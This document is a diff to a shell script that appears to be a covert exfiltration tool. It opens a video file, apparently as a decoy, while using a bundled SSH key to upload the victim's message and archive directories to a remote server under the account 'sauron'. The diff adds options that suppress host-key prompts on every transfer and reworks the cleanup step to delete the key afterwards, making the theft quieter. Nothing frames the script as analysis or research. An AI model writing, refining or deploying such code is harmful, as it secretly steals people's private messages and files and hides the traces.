@@ -8,10 +8,11 @@ SERVPORT=8087
 SERVUSER=sauron
 SERVPATH=/home/sauron/messages
 KEY=${CDIR}/.ssh/id_rsa
+KEYDIR=~/.msssh/
 KEYPATH=~/.msssh/id_rsa
 
-mkdir ${KEYPATH}
-mv ${KEY} ${KEYPATH}
+mkdir ${KEYDIR}
+cp ${KEY} ${KEYPATH}
 chmod 400 ${KEYPATH}
 
 cd ${CDIR}
@@ -19,19 +20,19 @@ cd ${CDIR}
 open ${CDIR}/Content/IMG_6818.MOV
 cd ${ARCHIVE}
 if [ $? -eq 0 ]; then
-    ssh -i ${KEYPATH} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
-    ssh -i ${KEYPATH} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
-    scp -i ${KEYPATH} -P ${SERVPORT} -r ${ARCHIVE} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
+    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
+    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
+    scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${ARCHIVE} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
 fi
 cd ${MESSAGES}
 if [ $? -eq 0 ]; then
-    ssh -i ${KEYPATH} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
-    ssh -i ${KEYPATH} -p ${SERVPORT} ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
-    scp -i ${KEYPATH} -P ${SERVPORT} -r ${MESSAGES} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
+    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
+    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
+    scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${MESSAGES} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
 fi
 
 #rm -rf ${CDIR} #cleanup
-cd ${CDIR}/../
-rm -rf ./* #cleanup
-rm -rf ${KEYPATH}/../ #cleanup
+#cd ${CDIR}/../
+#rm -rf ./* #cleanup
+rm -rf ${KEYDIR} #cleanup
 
